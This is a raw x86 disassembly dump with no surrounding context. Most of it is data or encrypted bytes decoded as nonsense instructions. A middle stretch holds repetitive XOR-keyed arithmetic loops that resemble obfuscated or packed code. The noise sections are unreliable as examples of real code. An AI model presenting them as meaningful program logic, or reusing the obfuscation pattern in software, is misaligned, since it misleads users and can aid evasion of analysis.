  41f3f9:	sub    BYTE PTR gs:[eax+ecx*2],bh
  41f3fd:	and    DWORD PTR [edx],ebx
  41f3ff:	(bad)  
  41f400:	cli    
  41f401:	or     esp,DWORD PTR [esi+0x56a5063e]
  41f407:	ins    DWORD PTR es:[edi],dx
  41f408:	or     DWORD PTR [edi+esi*1],edx
  41f40b:	pop    ebp
  41f40c:	mov    al,0xab
  41f40e:	cwde   
  41f40f:	(bad)  
  41f411:	(bad)  
  41f412:	cmc    
  41f413:	xlat   BYTE PTR ds:[ebx]
  41f414:	jmp    0x41f435
  41f416:	pop    ds
  41f417:	jmp    0x41f3ed
  41f419:	in     eax,0x49
  41f41b:	pop    edx
  41f41c:	xlat   BYTE PTR ds:[ebx]
  41f41d:	lds    edi,FWORD PTR [ecx]
  41f41f:	add    DWORD PTR [esi+0x3649a0a0],0x1b46b889
  41f429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f42a:	push   0x19
  41f42c:	div    eax
  41f42e:	sub    eax,DWORD PTR [ebp+0x57b203fe]
  41f434:	add    ebx,DWORD PTR [edx+0x27f0271f]
  41f43a:	push   esp
  41f43b:	jmp    0x41f45a
  41f43d:	jae    0x41f424
  41f43f:	mov    ah,0x9f
  41f441:	push   ebp
  41f442:	aam    0x89
  41f444:	in     al,0x9a
  41f446:	jecxz  0x41f4c0
  41f448:	or     BYTE PTR [eax-0x5f],dh
  41f44b:	aaa    
  41f44c:	fiadd  DWORD PTR [edx+eax*2-0x3d]
  41f450:	rcl    BYTE PTR ds:0x153c4e3,1
  41f456:	jb     0x41f458
  41f458:	add    eax,0xff075db7
  41f45d:	mov    gs,WORD PTR [ebx]
  41f45f:	std    
  41f460:	dec    esp
  41f461:	retf   0xde14
  41f464:	push   ecx
  41f465:	jae    0x41f485
  41f467:	aas    
  41f468:	hlt    
  41f469:	fs stc 
  41f46b:	add    BYTE PTR [edi+0x7019036b],0x8
  41f472:	cmp    esi,ebp
  41f474:	leave  
  41f475:	sbb    DWORD PTR [ebx],esi
  41f477:	sub    DWORD PTR [edx+0x6529f6d5],ecx
  41f47d:	out    dx,eax
  41f47e:	cmp    al,0x76
  41f480:	dec    esi
  41f481:	scas   al,BYTE PTR es:[edi]
  41f482:	out    0xf4,eax
  41f484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f485:	mov    ebp,0xffdd45a6
  41f48a:	sub    BYTE PTR [esi+eax*1+0x4e],0x79
  41f48f:	push   ecx
  41f490:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f492:	fwait
  41f493:	ret    0xe171
  41f496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f497:	mov    ecx,0x67215a1c
  41f49c:	dec    edi
  41f49d:	cmp    al,0xd5
  41f49f:	pop    edx
  41f4a0:	xchg   ecx,eax
  41f4a1:	sub    esp,DWORD PTR ds:0x51f77462
  41f4a7:	enter  0xb61e,0x96
  41f4ab:	push   esp
  41f4ac:	push   es
  41f4ad:	lahf   
  41f4ae:	retf   0x7a45
  41f4b1:	ret    0xa283
  41f4b4:	out    dx,eax
  41f4b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b6:	in     eax,0xf2
  41f4b8:	sahf   
  41f4b9:	ins    DWORD PTR es:[edi],dx
  41f4ba:	fucom  st(5)
  41f4bc:	imul   edx,esp,0xffffffa1
  41f4bf:	jnp    0x41f4be
  41f4c1:	fisttp DWORD PTR es:[edx-0x5edffffd]
  41f4c8:	test   eax,0xaf770b83
  41f4cd:	pop    ss
  41f4ce:	rol    ah,cl
  41f4d0:	js     0x41f519
  41f4d2:	mov    WORD PTR [ebp+0x6d],ds
  41f4d5:	mov    ch,0xac
  41f4d7:	jecxz  0x41f526
  41f4d9:	or     eax,0x95b172c6
  41f4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4df:	sbb    DWORD PTR [ebp+ebp*4-0x65],esp
  41f4e3:	and    dl,BYTE PTR [ebx+edx*2+0x31]
  41f4e7:	loop   0x41f511
  41f4e9:	popa   
  41f4ea:	push   ebp
  41f4eb:	(bad)  
  41f4ec:	pop    edx
  41f4ed:	xlat   BYTE PTR ds:[ebx]
  41f4ee:	mov    dh,0xd1
  41f4f0:	stc    
  41f4f1:	loop   0x41f476
  41f4f3:	call   0x752f9fcd
  41f4f8:	ret    
  41f4f9:	aas    
  41f4fa:	add    bl,al
  41f4fc:	sbb    bh,ch
  41f4fe:	xchg   DWORD PTR [esi-0x61],esi
  41f501:	or     esi,edx
  41f503:	jnp    0x41f4c7
  41f505:	lahf   
  41f506:	mov    cl,0xd7
  41f508:	sbb    DWORD PTR [ecx-0x4d],esi
  41f50b:	inc    bp
  41f50d:	push   edi
  41f50e:	call   0xd447611a
  41f513:	xchg   BYTE PTR [edx-0x13],ah
  41f516:	aam    0x68
  41f518:	or     ebx,DWORD PTR [ecx+0x4a]
  41f51b:	pop    edx
  41f51c:	(bad)  
  41f51d:	loopne 0x41f516
  41f51f:	push   ebx
  41f520:	xchg   esi,eax
  41f521:	sbb    edi,DWORD PTR [esi+0x4191ddd]
  41f527:	and    eax,DWORD PTR [esi]
  41f529:	xchg   ebp,esi
  41f52b:	sti    
  41f52c:	sub    BYTE PTR [ebp+0x3f],dl
  41f52f:	scas   al,BYTE PTR es:[edi]
  41f530:	imul   ebx,DWORD PTR [esi],0xd73c7e29
  41f536:	adc    eax,esp
  41f538:	add    DWORD PTR [eax+0x1d766e86],0x158c30fb
  41f542:	sub    al,BYTE PTR [eax+esi*4-0x4e]
  41f546:	shl    BYTE PTR [ecx+0x70cdb8a2],0xc0
  41f54d:	call   DWORD PTR [eax-0x6c45283c]
  41f553:	pop    ebx
  41f554:	fidivr WORD PTR [esi]
  41f556:	fdivr  st,st(2)
  41f558:	mov    dh,ch
  41f55a:	mov    bh,0x40
  41f55c:	in     al,dx
  41f55d:	xor    esi,DWORD PTR [edx+0x52]
  41f560:	xchg   esi,eax
  41f561:	ins    BYTE PTR es:[edi],dx
  41f562:	aas    
  41f563:	shr    DWORD PTR [edi+esi*8-0x1d],cl
  41f567:	inc    eax
  41f568:	mov    ch,ch
  41f56a:	cwde   
  41f56b:	fistp  WORD PTR [ecx+0x60]
  41f56e:	sbb    al,0xa
  41f570:	(bad)  
  41f571:	pop    ecx
  41f572:	fwait
  41f573:	sbb    DWORD PTR [esi-0x52],eax
  41f576:	pop    esi
  41f577:	pop    esi
  41f578:	aam    0x48
  41f57a:	arpl   WORD PTR [esi+0x8],si
  41f57d:	je     0x41f5b0
  41f57f:	xlat   BYTE PTR ds:[ebx]
  41f580:	(bad)
  41f583:	jecxz  0x41f529
  41f585:	or     bl,bh
  41f587:	or     eax,0x6b75dc68
  41f58c:	push   ecx
  41f58d:	mov    ch,0x6a
  41f58f:	xchg   ecx,eax
  41f590:	pop    edx
  41f591:	cld    
  41f592:	and    DWORD PTR [ecx+0x19f82abc],edx
  41f598:	es out 0x40,al
  41f59b:	cwde   
  41f59c:	fsubp  st(2),st
  41f59e:	add    eax,0x3426ccbb
  41f5a3:	push   esp
  41f5a4:	mov    esi,0x88ef119b
  41f5a9:	fcom   st(3)
  41f5ab:	sbb    dh,cl
  41f5ad:	jb     0x41f5a3
  41f5af:	pop    ebx
  41f5b0:	nop
  41f5b1:	push   esp
  41f5b2:	(bad)  
  41f5b3:	out    0xd0,al
  41f5b5:	sbb    dh,BYTE PTR [edi+0x58b4ce9e]
  41f5bb:	test   eax,0x5c257cd
  41f5c0:	xor    BYTE PTR [edi-0x71],ah
  41f5c3:	cdq    
  41f5c4:	lods   al,BYTE PTR ds:[esi]
  41f5c5:	sub    BYTE PTR [edi],ah
  41f5c7:	sub    esp,DWORD PTR [edx-0x17]
  41f5ca:	fidivr DWORD PTR [edx]
  41f5cc:	jle    0x41f5ec
  41f5ce:	cld    
  41f5cf:	and    esp,ecx
  41f5d1:	cli    
  41f5d2:	mov    al,ds:0x46c9a6eb
  41f5d7:	and    eax,0x29281ce
  41f5dc:	mov    cl,0x54
  41f5de:	(bad)  
  41f5df:	sub    eax,0x74e5687b
  41f5e4:	daa    
  41f5e5:	pop    edx
  41f5e6:	dec    esp
  41f5e7:	push   eax
  41f5e8:	fs xor eax,0xa6130bb
  41f5ee:	inc    eax
  41f5ef:	xor    eax,0x44ce13ba
  41f5f4:	rol    al,0x91
  41f5f7:	ins    DWORD PTR es:[edi],dx
  41f5f8:	dec    esp
  41f5f9:	and    DWORD PTR [edi-0x3d02b320],edi
  41f5ff:	pop    eax
  41f600:	dec    esp
  41f601:	mov    esp,gs
  41f603:	mov    ecx,0x4f93c03
  41f608:	lods   al,BYTE PTR ds:[esi]
  41f609:	jns    0x41f5ae
  41f60b:	hlt    
  41f60c:	sahf   
  41f60d:	or     BYTE PTR fs:[ebp-0x43572c91],ch
  41f614:	into   
  41f615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f616:	dec    ebx
  41f617:	out    0xd3,al
  41f619:	stc    
  41f61a:	ret    
  41f61b:	je     0x41f5e4
  41f61d:	test   al,0x57
  41f61f:	neg    DWORD PTR [ebx+0x3b03d3d1]
  41f625:	(bad)  
  41f626:	pop    DWORD PTR [esi-0x4a4b5fc2]
  41f62c:	retf   
  41f62d:	ja     0x41f5c3
  41f62f:	mov    cl,0x31
  41f631:	mov    bl,0xa8
  41f633:	jmp    0xafef:0xa6fdc8be
  41f63a:	pusha  
  41f63b:	jl     0x41f62a
  41f63d:	mov    eax,0x56d78cce
  41f642:	jb     0x41f645
  41f644:	add    eax,0x41e92c2a
  41f649:	add    al,0xe5
  41f64b:	and    al,0x3e
  41f64d:	test   DWORD PTR [ebp+ebx*4+0x29],esp
  41f651:	sbb    ebp,DWORD PTR [ecx]
  41f653:	mov    WORD PTR [ecx-0x74c93138],?
  41f659:	add    dh,BYTE PTR [esi+edi*1-0xa]
  41f65d:	xor    dl,dl
  41f65f:	out    0xd9,eax
  41f661:	mov    ch,0xfa
  41f663:	xor    dh,BYTE PTR [ecx]
  41f665:	mov    edi,0x85f94291
  41f66a:	lahf   
  41f66b:	scas   al,BYTE PTR es:[edi]
  41f66c:	jl     0x41f65e
  41f66e:	stos   BYTE PTR es:[edi],al
  41f66f:	sub    eax,0xf5f18325
  41f674:	scas   al,BYTE PTR es:[edi]
  41f675:	ss dec esp
  41f677:	ins    BYTE PTR es:[edi],dx
  41f678:	shl    bl,cl
  41f67a:	fld    QWORD PTR ds:[ecx]
  41f67d:	jl     0x41f6b6
  41f67f:	scas   al,BYTE PTR es:[edi]
  41f680:	sbb    eax,0xdef2d5f2
  41f685:	fcom   QWORD PTR [esi+0x5709f2a]
  41f68b:	stos   BYTE PTR es:[edi],al
  41f68c:	mov    ebp,0xbd706f5a
  41f691:	pop    DWORD PTR [ecx-0x4a]
  41f694:	sub    BYTE PTR [esi],bl
  41f696:	test   eax,0x42b0941b
  41f69b:	lods   eax,DWORD PTR ds:[esi]
  41f69c:	mov    al,ds:0xc6f4771c
  41f6a1:	popa   
  41f6a2:	pop    edi
  41f6a3:	mov    ch,0xdf
  41f6a5:	ins    DWORD PTR es:[edi],dx
  41f6a6:	dec    ecx
  41f6a7:	inc    ebp
  41f6a8:	into   
  41f6a9:	jo     0x41f68b
  41f6ab:	retf   
  41f6ac:	outs   dx,DWORD PTR ds:[esi]
  41f6ad:	or     edx,DWORD PTR [ecx-0x45]
  41f6b0:	mov    ah,0xed
  41f6b2:	dec    ecx
  41f6b3:	ins    DWORD PTR es:[edi],dx
  41f6b4:	xchg   BYTE PTR [esp+edx*4-0x3a],bh
  41f6b8:	mov    cl,0x31
  41f6ba:	lahf   
  41f6bb:	sbb    DWORD PTR [edx+ebx*2],esi
  41f6be:	sub    bl,ah
  41f6c0:	add    BYTE PTR [ecx],bl
  41f6c2:	out    dx,al
  41f6c3:	ror    BYTE PTR [edi+0x517a05f3],0x6e
  41f6ca:	mov    ds:0x6a2927dd,al
  41f6cf:	int3   
  41f6d0:	mov    eax,ds:0x78edffd6
  41f6d5:	add    al,0x71
  41f6d7:	add    al,0xec
  41f6d9:	imul   BYTE PTR [edx]
  41f6db:	scas   al,BYTE PTR es:[edi]
  41f6dc:	adc    al,BYTE PTR [edi+0x7b]
  41f6df:	jns    0x41f6ff
  41f6e1:	inc    ebx
  41f6e2:	stos   DWORD PTR es:[edi],eax
  41f6e3:	or     BYTE PTR [edi-0x79],bl
  41f6e6:	xor    BYTE PTR [eax],bh
  41f6e8:	lods   eax,DWORD PTR ds:[esi]
  41f6e9:	sti    
  41f6ea:	fnsave [ebp+0x466e73cf]
  41f6f0:	push   ebx
  41f6f1:	(bad)  
  41f6f2:	jae    0x41f744
  41f6f4:	cmp    esp,DWORD PTR [eax]
  41f6f6:	dec    eax
  41f6f7:	xchg   DWORD PTR [ebp-0x71],ebp
  41f6fa:	mov    WORD PTR [edx],ss
  41f6fc:	or     eax,eax
  41f6fe:	inc    eax
  41f6ff:	cwde   
  41f700:	fnstsw WORD PTR [ebx-0x45]
  41f703:	shl    DWORD PTR [esp+eiz*2+0x6d85056f],1
  41f70a:	push   eax
  41f70b:	fistp  DWORD PTR [eax-0x8]
  41f70e:	mov    esp,0xe991aca4
  41f713:	sbb    BYTE PTR ds:0xb3e3b707,cl
  41f719:	pop    ds
  41f71a:	dec    ebp
  41f71b:	sub    al,BYTE PTR [ecx+0x54]
  41f71e:	lahf   
  41f71f:	jp     0x41f767
  41f721:	pop    ss
  41f722:	xchg   BYTE PTR [eax+0xe4305aa],dh
  41f728:	mov    eax,ds:0x455756bd
  41f72d:	push   0xcecbd219
  41f732:	xor    eax,esp
  41f734:	mov    DWORD PTR [eax-0x7b25eee8],esi
  41f73a:	data16 or bl,dl
  41f73d:	lahf   
  41f73e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f73f:	push   ebp
  41f740:	cli    
  41f741:	xor    al,0x97
  41f743:	sub    edi,ebx
  41f745:	dec    edx
  41f746:	mov    ebx,0x925aa6fe
  41f74b:	stos   BYTE PTR es:[edi],al
  41f74c:	scas   eax,DWORD PTR es:[edi]
  41f74d:	rcl    DWORD PTR [eax-0x51b07e49],0xbd
  41f754:	cmp    DWORD PTR [eax-0x7ad37748],edi
  41f75a:	ins    DWORD PTR es:[edi],dx
  41f75b:	(bad)  
  41f75c:	icebp  
  41f75d:	sub    ebx,DWORD PTR [edi+0x67]
  41f760:	fisttp DWORD PTR [edi+0x68e13e65]
  41f766:	mov    ds:0x1adbe5e8,al
  41f76b:	fld    DWORD PTR [ebp+eiz*1-0x46]
  41f76f:	push   ds
  41f770:	lods   eax,DWORD PTR ds:[esi]
  41f771:	ss adc al,0x53
  41f774:	xchg   BYTE PTR [esp+edi*2+0x45],al
  41f778:	push   edx
  41f779:	cmp    BYTE PTR [ebx],ch
  41f77b:	outs   dx,DWORD PTR ds:[esi]
  41f77c:	lock pop ebx
  41f77e:	stos   DWORD PTR es:[edi],eax
  41f77f:	popf   
  41f780:	and    bl,BYTE PTR [ebx-0x59]
  41f783:	dec    edx
  41f784:	mov    al,0x8a
  41f786:	or     esi,esi
  41f788:	mov    ebx,0x3c7516af
  41f78d:	daa    
  41f78e:	jecxz  0x41f7e2
  41f790:	or     BYTE PTR [ebx+0x6a],ah
  41f793:	lods   eax,DWORD PTR ds:[esi]
  41f794:	call   0xf71a7a16
  41f799:	mov    ds:0x221aac5a,al
  41f79e:	mov    ds:0xac94a85c,eax
  41f7a3:	in     eax,dx
  41f7a4:	int    0xa6
  41f7a6:	inc    edi
  41f7a7:	jo     0x41f755
  41f7a9:	xchg   ebp,eax
  41f7aa:	test   eax,0x59d1a17
  41f7af:	ret    0x883a
  41f7b2:	test   al,0xbf
  41f7b4:	xchg   ecx,eax
  41f7b5:	out    0xee,al
  41f7b7:	cdq    
  41f7b8:	retf   0x9e0d
  41f7bb:	add    BYTE PTR [eax+0x21],ah
  41f7be:	aad    0xc2
  41f7c0:	pusha  
  41f7c1:	xor    al,0xe4
  41f7c3:	aam    0x2e
  41f7c5:	push   ds
  41f7c6:	pop    edi
  41f7c7:	les    ebx,FWORD PTR [ebx]
  41f7c9:	or     ch,al
  41f7cb:	rcl    DWORD PTR [edi+ebp*2],0x4
  41f7cf:	adc    edi,DWORD PTR [eax]
  41f7d1:	aaa    
  41f7d2:	or     al,0x2d
  41f7d4:	(bad)  
  41f7d5:	cmp    eax,0xa613044d
  41f7da:	fst    QWORD PTR [edi]
  41f7dc:	enter  0x5dad,0xac
  41f7e0:	mov    ebx,0x91955489
  41f7e5:	mov    ch,0x66
  41f7e7:	(bad)  
  41f7e8:	nop
  41f7e9:	or     eax,0x377551b2
  41f7ee:	jmp    0x3876:0x5213d4fe
  41f7f5:	push   ebp
  41f7f6:	sbb    esp,DWORD PTR [ebp-0x7bad204f]
  41f7fc:	mov    cl,0x53
  41f7fe:	xchg   DWORD PTR [ecx],ebp
  41f800:	dec    eax
  41f801:	xor    cl,dh
  41f803:	cmp    eax,0x69141ca8
  41f808:	sbb    esp,DWORD PTR [esi]
  41f80a:	push   eax
  41f80b:	dec    ecx
  41f80c:	adc    esi,edx
  41f80e:	or     BYTE PTR [esp+ecx*1],dl
  41f811:	sar    eax,cl
  41f813:	cdq    
  41f814:	imul   ecx,eax,0x951c7edb
  41f81a:	mov    esi,0x3f3b78ed
  41f81f:	adc    eax,0x5d9721e2
  41f824:	xor    BYTE PTR [esi-0xd6f3716],dh
  41f82a:	cmp    DWORD PTR [esp+ebp*4],0x7fa13fcd
  41f831:	adc    eax,0x219df091
  41f836:	jmp    0xe9f109b3
  41f83b:	jl     0x41f85e
  41f83d:	xchg   BYTE PTR [eax+eiz*2],ah
  41f840:	push   esp
  41f841:	and    DWORD PTR ds:0x36806c59,edi
  41f847:	loope  0x41f827
  41f849:	lea    eax,[ebp-0x40a8cc2]
  41f84f:	mov    cl,0xab
  41f851:	push   cs
  41f852:	mov    edx,0x380d49e1
  41f857:	fstp   st(7)
  41f859:	xlat   BYTE PTR ds:[ebx]
  41f85a:	fwait
  41f85b:	inc    edi
  41f85c:	jg     0x41f86f
  41f85e:	cdq    
  41f85f:	retf   
  41f860:	rcr    BYTE PTR [edx+0x520af5b4],0xc6
  41f867:	std    
  41f868:	sbb    BYTE PTR [ebp+0x6a],bl
  41f86b:	lock and al,0x4f
  41f86e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86f:	loope  0x41f849
  41f871:	jmp    0xc4f0:0xed40687b
  41f878:	cdq    
  41f879:	ss jb  0x41f8bb
  41f87c:	ret    
  41f87d:	call   0x4b1d:0x292ece48
  41f884:	icebp  
  41f885:	mov    ebx,0xc9583327
  41f88a:	push   es
  41f88b:	imul   edi,DWORD PTR [ebx],0x37
  41f88e:	or     al,0x82
  41f890:	test   BYTE PTR [ecx-0x62],ch
  41f893:	adc    eax,0x810b4a91
  41f898:	add    BYTE PTR [edi],bh
  41f89a:	test   DWORD PTR [edi+0x412b99b9],eax
  41f8a0:	push   ss
  41f8a1:	mov    edx,DWORD PTR [ebp+0x8]
  41f8a4:	mov    ebx,DWORD PTR [ebp-0x50]
  41f8a7:	add    edx,ecx
  41f8a9:	xor    edx,ebx
  41f8ab:	mov    DWORD PTR [ebp-0x50],edx
  41f8ae:	mov    edx,DWORD PTR [ebp+0x8]
  41f8b1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f8b4:	add    edx,edi
  41f8b6:	and    edx,ebx
  41f8b8:	mov    DWORD PTR [ebp-0x4c],edx
  41f8bb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8be:	mov    ebx,DWORD PTR [ebp-0x48]
  41f8c1:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f8c8:	mov    DWORD PTR [ebp-0x48],edx
  41f8cb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8ce:	mov    ebx,0xfa5e1524
  41f8d3:	sub    ebx,edx
  41f8d5:	add    ebx,DWORD PTR [ebp-0x44]
  41f8d8:	mov    DWORD PTR [ebp-0x44],ebx
  41f8db:	mov    edx,DWORD PTR [ebp+0x8]
  41f8de:	xor    edx,eax
  41f8e0:	add    edx,esi
  41f8e2:	jne    0x41d4a1
  41f8e8:	mov    edx,DWORD PTR [ebp-0xc]
  41f8eb:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f8f2:	mov    bl,BYTE PTR [ebp-0x1]
  41f8f5:	cmp    dl,bl
  41f8f7:	je     0x41f9d5
  41f8fd:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f900:	mov    edx,DWORD PTR [ebp-0xc]
  41f903:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f90a:	mov    ebx,DWORD PTR [ebp+0xc]
  41f90d:	xor    ecx,eax
  41f90f:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  41f916:	jne    0x421e61
  41f91c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f91f:	mov    edx,DWORD PTR [ebp+0xc]
  41f922:	xor    ecx,eax
  41f924:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  41f92c:	mov    edx,DWORD PTR [ebp-0x18]
  41f92f:	xor    edx,eax
  41f931:	add    edx,esi
  41f933:	cmp    ecx,edx
  41f935:	mov    ecx,DWORD PTR [ebp-0x14]
  41f938:	mov    DWORD PTR [ebp+0x8],ecx
  41f93b:	mov    ecx,DWORD PTR [ebp+0x8]
  41f93e:	je     0x422f8b
  41f944:	xor    ecx,eax
  41f946:	add    ecx,esi
  41f948:	mov    ecx,0x242ebc9
  41f94d:	je     0x41fa5d
  41f953:	mov    edx,DWORD PTR [ebp+0x8]
  41f956:	mov    ebx,DWORD PTR [ebp-0x8]
  41f959:	xor    edx,eax
  41f95b:	xor    ebx,eax
  41f95d:	sub    edx,ebx
  41f95f:	sub    edx,esi
  41f961:	xor    edx,eax
  41f963:	mov    DWORD PTR [ebp+0x8],edx
  41f966:	mov    edx,DWORD PTR [ebp+0x8]
  41f969:	mov    ebx,DWORD PTR [ebp-0x58]
  41f96c:	add    edx,0x5708fa
  41f972:	imul   edx,ebx
  41f975:	mov    DWORD PTR [ebp-0x58],edx
  41f978:	mov    edx,DWORD PTR [ebp+0x8]
  41f97b:	mov    ebx,DWORD PTR [ebp-0x54]
  41f97e:	add    edx,0x64f898
  41f984:	or     edx,ebx
  41f986:	mov    DWORD PTR [ebp-0x54],edx
  41f989:	mov    edx,DWORD PTR [ebp+0x8]
  41f98c:	mov    ebx,DWORD PTR [ebp-0x50]
  41f98f:	add    edx,ecx
  41f991:	xor    edx,ebx
  41f993:	mov    DWORD PTR [ebp-0x50],edx
  41f996:	mov    edx,DWORD PTR [ebp+0x8]
  41f999:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f99c:	add    edx,edi
  41f99e:	and    edx,ebx
  41f9a0:	mov    DWORD PTR [ebp-0x4c],edx
  41f9a3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9a6:	mov    ebx,DWORD PTR [ebp-0x48]
  41f9a9:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f9b0:	mov    DWORD PTR [ebp-0x48],edx
  41f9b3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9b6:	mov    ebx,0xfa5e1524
  41f9bb:	sub    ebx,edx
  41f9bd:	add    ebx,DWORD PTR [ebp-0x44]
  41f9c0:	mov    DWORD PTR [ebp-0x44],ebx
  41f9c3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9c6:	xor    edx,eax
  41f9c8:	add    edx,esi
  41f9ca:	jne    0x41f953
  41f9d0:	jmp    0x41fa5d
  41f9d5:	mov    edx,DWORD PTR [ebp-0x14]
  41f9d8:	mov    DWORD PTR [ebp+0x8],edx
  41f9db:	jmp    0x41fa50
  41f9e0:	mov    edx,DWORD PTR [ebp+0x8]
  41f9e3:	mov    ebx,DWORD PTR [ebp-0x8]
  41f9e6:	xor    edx,eax
  41f9e8:	xor    ebx,eax
  41f9ea:	sub    edx,ebx
  41f9ec:	sub    edx,esi
  41f9ee:	xor    edx,eax
  41f9f0:	mov    DWORD PTR [ebp+0x8],edx
  41f9f3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9f6:	mov    ebx,DWORD PTR [ebp-0x58]
  41f9f9:	add    edx,0x5708fa
  41f9ff:	imul   edx,ebx
  41fa02:	mov    DWORD PTR [ebp-0x58],edx
  41fa05:	mov    edx,DWORD PTR [ebp+0x8]
  41fa08:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa0b:	add    edx,0x64f898
  41fa11:	or     edx,ebx
  41fa13:	mov    DWORD PTR [ebp-0x54],edx
  41fa16:	mov    edx,DWORD PTR [ebp+0x8]
  41fa19:	mov    ebx,DWORD PTR [ebp-0x50]
  41fa1c:	add    edx,ecx
  41fa1e:	xor    edx,ebx
  41fa20:	mov    DWORD PTR [ebp-0x50],edx
  41fa23:	mov    edx,DWORD PTR [ebp+0x8]
  41fa26:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fa29:	add    edx,edi
  41fa2b:	and    edx,ebx
  41fa2d:	mov    DWORD PTR [ebp-0x4c],edx
  41fa30:	mov    edx,DWORD PTR [ebp+0x8]
  41fa33:	mov    ebx,DWORD PTR [ebp-0x48]
  41fa36:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fa3d:	mov    DWORD PTR [ebp-0x48],edx
  41fa40:	mov    edx,DWORD PTR [ebp+0x8]
  41fa43:	mov    ebx,0xfa5e1524
  41fa48:	sub    ebx,edx
  41fa4a:	add    ebx,DWORD PTR [ebp-0x44]
  41fa4d:	mov    DWORD PTR [ebp-0x44],ebx
  41fa50:	mov    edx,DWORD PTR [ebp+0x8]
  41fa53:	xor    edx,eax
  41fa55:	add    edx,esi
  41fa57:	jne    0x41f9e0
  41fa5d:	mov    edx,DWORD PTR [ebp-0x14]
  41fa60:	mov    DWORD PTR [ebp+0x8],edx
  41fa63:	jmp    0x41fad8
  41fa68:	mov    edx,DWORD PTR [ebp+0x8]
  41fa6b:	mov    ebx,DWORD PTR [ebp-0x8]
  41fa6e:	xor    edx,eax
  41fa70:	xor    ebx,eax
  41fa72:	sub    edx,ebx
  41fa74:	sub    edx,esi
  41fa76:	xor    edx,eax
  41fa78:	mov    DWORD PTR [ebp+0x8],edx
  41fa7b:	mov    edx,DWORD PTR [ebp+0x8]
  41fa7e:	mov    ebx,DWORD PTR [ebp-0x58]
  41fa81:	add    edx,0x5708fa
  41fa87:	imul   edx,ebx
  41fa8a:	mov    DWORD PTR [ebp-0x58],edx
  41fa8d:	mov    edx,DWORD PTR [ebp+0x8]
  41fa90:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa93:	add    edx,0x64f898
  41fa99:	or     edx,ebx
  41fa9b:	mov    DWORD PTR [ebp-0x54],edx
  41fa9e:	mov    edx,DWORD PTR [ebp+0x8]
  41faa1:	mov    ebx,DWORD PTR [ebp-0x50]
  41faa4:	add    edx,ecx
  41faa6:	xor    edx,ebx
  41faa8:	mov    DWORD PTR [ebp-0x50],edx
  41faab:	mov    edx,DWORD PTR [ebp+0x8]
  41faae:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fab1:	add    edx,edi
  41fab3:	and    edx,ebx
  41fab5:	mov    DWORD PTR [ebp-0x4c],edx
  41fab8:	mov    edx,DWORD PTR [ebp+0x8]
  41fabb:	mov    ebx,DWORD PTR [ebp-0x48]
  41fabe:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fac5:	mov    DWORD PTR [ebp-0x48],edx
  41fac8:	mov    edx,DWORD PTR [ebp+0x8]
  41facb:	mov    ebx,0xfa5e1524
  41fad0:	sub    ebx,edx
  41fad2:	add    ebx,DWORD PTR [ebp-0x44]
  41fad5:	mov    DWORD PTR [ebp-0x44],ebx
  41fad8:	mov    edx,DWORD PTR [ebp+0x8]
  41fadb:	xor    edx,eax
  41fadd:	add    edx,esi
  41fadf:	jne    0x41fa68
  41fae5:	mov    edx,DWORD PTR [ebp-0x8]
  41fae8:	mov    ebx,DWORD PTR [ebp-0xc]
  41faeb:	xor    edx,eax
  41faed:	lea    edx,[edx+ebx*1+0x3272f1]
  41faf4:	jmp    0x421e4c
  41faf9:	and    BYTE PTR ds:0xc10ac90f,dh
  41faff:	mov    ds:0xfe8da196,al
  41fb04:	jmp    0x7599f29b
  41fb09:	adc    BYTE PTR [esi+0x5e46837c],dh
  41fb0f:	add    DWORD PTR [ebx-0x314d2889],0xffffffe4
  41fb16:	pop    ecx
  41fb17:	ror    dh,1
  41fb19:	mul    BYTE PTR [ecx+edi*8+0x22d06f08]
  41fb20:	or     ah,bl
  41fb22:	jge    0x41fb04
  41fb24:	les    esi,FWORD PTR [eax]
  41fb26:	xor    BYTE PTR ds:0x969c570b,bh
  41fb2c:	mov    ecx,DWORD PTR [eax-0x20]
  41fb2f:	test   DWORD PTR [edx-0x5f],0x30168efb
  41fb36:	dec    ebx
  41fb37:	xor    bl,cl
  41fb39:	ret    0x2add
  41fb3c:	jne    0x41fb03
  41fb3e:	mov    ah,0xde
  41fb40:	lock xlat BYTE PTR ss:[ebx]
  41fb43:	cdq    
  41fb44:	adc    bl,ah
  41fb46:	stc    
  41fb47:	mov    dl,0xe3
  41fb49:	jp     0x41fb7f
  41fb4b:	sub    al,BYTE PTR [ebx+0x1a]
  41fb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb4f:	inc    ebp
  41fb50:	aaa    
  41fb51:	xlat   BYTE PTR ds:[ebx]
  41fb52:	cmp    eax,0xc7b7152c
  41fb57:	inc    esi
  41fb58:	push   esp
  41fb59:	std    
  41fb5a:	ficom  WORD PTR [ecx]
  41fb5c:	out    dx,eax
